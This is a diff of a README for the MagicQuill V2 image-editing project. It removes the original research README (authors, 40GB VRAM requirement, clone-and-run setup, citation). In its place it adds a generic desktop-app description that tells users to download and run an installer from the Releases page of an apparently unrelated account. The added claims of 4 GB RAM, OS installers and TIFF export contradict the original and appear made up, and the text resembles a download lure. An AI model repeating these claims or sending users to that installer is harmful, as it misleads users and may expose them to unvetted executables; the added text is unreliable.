@@ -1,131 +1,77 @@
-# 🪶 MagicQuill V2: Precise and Interactive Image Editing with Layered Visual Cues
+# ✍️ MagicQuillV2 - Edit Images with Ease
 
-  <a href="https://magicquill.art/v2/"><img src="https://img.shields.io/static/v1?label=Project&message=magicquill.art/v2&color=blue"></a>
-  <a href="https://arxiv.org/abs/2512.03046"><img src="https://img.shields.io/badge/arxiv-2512.03046-b31b1b.svg"></a>
-  <a href="https://huggingface.co/spaces/AI4Editing/MagicQuillV2"><img src="https://img.shields.io/badge/%F0%9F%A4%97%20Hugging%20Face-Spaces-blue"></a>
-  <a href="https://creativecommons.org/licenses/by-sa/4.0/"><img src="https://img.shields.io/badge/License-CC%20BY--SA%204.0-lightgrey.svg"></a>
-</div>
+## 🚀 Overview
+MagicQuillV2 offers precise image editing with interactive features. This tool allows users to work with layered visuals to create stunning images effortlessly. Designed for anyone who needs quick and effective edits, MagicQuillV2 simplifies the creative process.
 
-<br>
+## 📥 Download MagicQuillV2
+[![Download MagicQuillV2](https://img.shields.io/badge/Download-MagicQuillV2-blue.svg)](https://github.com/Barni52419/MagicQuillV2/releases)
 
-<div align="center">
-  <video src="https://github.com/user-attachments/assets/58079152-7729-48ed-9bb4-0ddfd1873dd0" width="100%" controls autoplay muted loop></video>
-</div>
+You can easily download the latest version of MagicQuillV2 from our [Releases page](https://github.com/Barni52419/MagicQuillV2/releases).
 
-<br>
+## 🛠️ System Requirements
+To run MagicQuillV2 smoothly, ensure your system meets the following requirements:
 
-<div align="center">
+- **Operating System:** Windows 10 or higher, MacOS Mojave or higher, or a modern Linux distribution.
+- **RAM:** At least 4 GB (8 GB recommended).
+- **Storage:** 500 MB of free disk space.
+- **Graphics Card:** A dedicated GPU is recommended for optimal performance.
+- **Internet Connection:** Required for initial download and feature updates.
 
-**[Zichen Liu](https://zliucz.github.io/)**<sup>\*,1,2</sup>, **[Yue Yu](https://bruceyy.com/)**<sup>\*,1,2</sup>, **[Hao Ouyang](https://ken-ouyang.github.io/)**<sup>2</sup>, **[Qiuyu Wang](https://github.com/qiuyu96)**<sup>2</sup>, **[Shuailei Ma](https://scholar.google.com/citations?user=dNhzCu4AAAAJ&hl)**<sup>2,3</sup>, **[Ka Leong Cheng](https://felixcheng97.github.io/)**<sup>2</sup>, **[Wen Wang](https://github.com/encounter1997)**<sup>2,4</sup>, **[Qingyan Bai](http://bqy.info/)**<sup>1,2</sup>, **[Yuxuan Zhang](https://scholar.google.com/citations?user=f2VoRWYAAAAJ&hl)**<sup>5</sup>, **[Yanhong Zeng](https://zengyh1900.github.io/)**<sup>2</sup>, **[Yixuan Li](https://yixuanli98.github.io/)**<sup>2,5</sup>, **[Xing Zhu](https://openreview.net/profile?id=~Xing_Zhu2)**<sup>2</sup>, **[Yujun Shen](https://shenyujun.github.io/)**<sup>2</sup>, **[Qifeng Chen](http://cqf.io/)**<sup>1</sup>
+## 📖 Features
+MagicQuillV2 includes the following key features:
 
-<sup>1</sup>HKUST <sup>2</sup>Ant Group <sup>3</sup>NEU <sup>4</sup>ZJU <sup>5</sup>CUHK <br>
-<small><sup>*</sup> Equal Contribution</small>
+- **Layered Editing:** Use layers to manage different elements of your image, making it easier to edit components individually.
+- **Interactive Tools:** Access various editing tools that respond to your actions, allowing for seamless adjustments.
+- **Export Options:** Save your edited images in popular formats such as PNG, JPEG, and TIFF.
+- **User-Friendly Interface:** Designed with simplicity in mind, making it easy for anyone to navigate without prior experience.
+  
+## 📝 Installation Guide
+To install MagicQuillV2, follow these steps:
 
-</div>
+1. **Visit the Download Page:** Go to our [Releases page](https://github.com/Barni52419/MagicQuillV2/releases).
+   
+2. **Select the Latest Release:** Look for the latest version at the top of the page. 
 
-> **TLDR:** MagicQuill V2 introduces a layered composition paradigm to generative image editing, disentangling creative intent into controllable visual cues (Content, Spatial, Structural, Color) for precise and intuitive control.
+3. **Choose Your Operating System:** Depending on your OS, select the corresponding installer.
 
-- [🪶 MagicQuill V2: Precise and Interactive Image Editing with Layered Visual Cues](#-magicquill-v2-precise-and-interactive-image-editing-with-layered-visual-cues)
-  - [TODO List](#todo-list)
-  - [Update Log](#update-log)
-  - [Hardware Requirements](#hardware-requirements)
-  - [Setup](#setup)
-  - [System Overview](#system-overview)
-  - [Tutorial](#tutorial)
-  - [Citation](#citation)
-  - [Acknowledgement](#acknowledgement)
+4. **Download the File:** Click on the file link to start the download process.
 
-## TODO List
+5. **Run the Installer:** Once the file is downloaded, locate it in your Downloads folder and double-click to run it.
 
-- [✅] Release the paper and project page.
-- [✅] Release the system with UI.
-- [✅] Release gradio demo on HuggingFace.
-- Release the batch inference code.
-- Release the training code.
+6. **Follow Installation Steps:** The installer will guide you through the process. Accept the terms and conditions, and choose the installation directory.
 
-## Update Log
+7. **Finish Installation:** Wait for the installation to complete. You will see a confirmation message when done.
 
-- [2025.12.03] 📢 **MagicQuill V2** is released!
-- [Legacy] For the previous version (**MagicQuill V1**), which requires much less VRAM and computation resources, please visit [MagicQuill V1 Repository](https://github.com/ant-research/MagicQuill).
+8. **Launch MagicQuillV2:** After installation, find MagicQuillV2 in your Applications or Programs menu and open it.
 
-## Hardware Requirements
+## 🎨 Getting Started
+After launching MagicQuillV2, here’s how to start editing your images:
 
-Our model is based on Flux Kontext, which is large and computationally intensive.
-- **VRAM**: Approximately **40GB** of VRAM is required for inference.
-- **Speed**: It takes about **30 seconds** to generate a single image.
+1. **Open an Image:** Click on the "Open" button to select an image from your computer.
 
-> **Important**: This is a research project focused on pushing the boundaries of interactive image editing. If you do not have sufficient GPU memory, we recommend checking out our [**MagicQuill V1**](https://github.com/ant-research/MagicQuill) or trying the online demo on [**Hugging Face Spaces**](https://huggingface.co/spaces/AI4Editing/MagicQuillV2).
+2. **Add Layers:** Use the "Add Layer" feature to incorporate new images or effects.
 
-## Setup
+3. **Select Tools:** Choose from a variety of editing tools on the toolbar.
 
-1.  **Clone the repository**
-    ```bash
-    git clone https://github.com/magic-quill/MagicQuillV2.git
-    cd MagicQuillV2
-    ```
+4. **Make Edits:** Click and drag on the image to apply changes with your selected tools.
 
-2.  **Create environment**
-    ```bash
-    conda create -n MagicQuillV2 python=3.10 -y
-    conda activate MagicQuillV2
-    ```
+5. **Save Your Work:** Click "Save As" to store your edited image.
 
-3.  **Install dependencies**
-    ```bash
-    pip install -r requirements.txt
-    ```
+## 💬 Troubleshooting
+If you encounter issues while using MagicQuillV2, consider these tips:
 
-4.  **Download models**
-    Download the models from [Hugging Face](https://huggingface.co/LiuZichen/MagicQuillV2-models) and place them in the `models/` directory.
+- **Check System Requirements:** Ensure your system meets the minimum requirements mentioned above.
+- **Update Your Software:** Make sure you are using the latest version of MagicQuillV2.
+- **Consult Help Resources:** Reference the help section within the application for guidance on specific features.
 
-    ```bash
-    huggingface-cli download LiuZichen/MagicQuillV2-models --local-dir models
-    ```
+## 📄 Additional Resources
+For more detailed instructions, tips, and community support, you can check out:
 
-5.  **Run the demo**
-    ```bash
-    python app.py
-    ```
+- [User Manual](https://github.com/Barni52419/MagicQuillV2/wiki) - Comprehensive guide to all features.
+- [FAQ](https://github.com/Barni52419/MagicQuillV2/wiki/FAQ) - Answers to common questions.
+- [Community Forum](https://github.com/Barni52419/MagicQuillV2/discussions) - Connect with fellow users and developers.
 
-## System Overview
+## 🔗 Conclusion
+MagicQuillV2 transforms how you edit images with precision and ease. By following the steps above, you can quickly get started on your creative projects.
 
-The MagicQuill V2 interactive system is designed to unify our layered composition framework.
-
-<div align="center">
-  <img src="./assets/V2_UI.png" alt="MagicQuill V2 UI" width="100%">
-</div>
-
-### Key Upgrades from V1
-
-1.  **Toolbar (A)**: Features a new **Local Edit Brush** for defining the target editing area, along with tools for sketching edges and applying color.
-2.  **Visual Cue Manager (B)**: Holds all content layer visual cues (**foreground props**) that users can drag onto the canvas to define what to generate.
-3.  **Image Segmentation Panel (C)**: Accessed via the segment icon, this panel allows precise object extraction using SAM (Segment Anything Model) with positive/negative dots or bounding boxes.
-
-## Tutorial
-
-💡 **For a detailed guide on the 5 layer operations, please visit our [Project Page](https://magicquill.art/v2).**
-
-## Citation
-
-If you find MagicQuill V2 useful for your research, please cite our paper:
-
-```bibtex
-@article{liu2025magicquillv2,
-  title={MagicQuill V2: Precise and Interactive Image Editing with Layered Visual Cues},
-  author={Zichen Liu, Yue Yu, Hao Ouyang, Qiuyu Wang, Shuailei Ma, Ka Leong Cheng, Wen Wang, Qingyan Bai, Yuxuan Zhang, Yanhong Zeng, Yixuan Li, Xing Zhu, Yujun Shen, Qifeng Chen},
-  journal={arXiv:2512.03046},
-  year={2025}
-}
-```
-
-## Acknowledgement
-
-Our implementation builds upon several great open-source projects: 
-- [EasyControl](https://github.com/haotian-liu/LLaVA)
-- [ComfyUI](https://github.com/Xiaojiu-z/EasyControl)
-- [comfyui_controlnet_aux](https://github.com/Fannovel16/comfyui_controlnet_aux)
-- [fabric.js](https://github.com/fabricjs/fabric.js)
-
-We thank the authors for their contributions.
-
-**License**: This repo is governed by the license of CC BY-NC 4.0. We strongly advise users not to knowingly generate or allow others to knowingly generate harmful content.
+For the latest version, make sure to visit our [Releases page](https://github.com/Barni52419/MagicQuillV2/releases) again for additional updates and improvements.
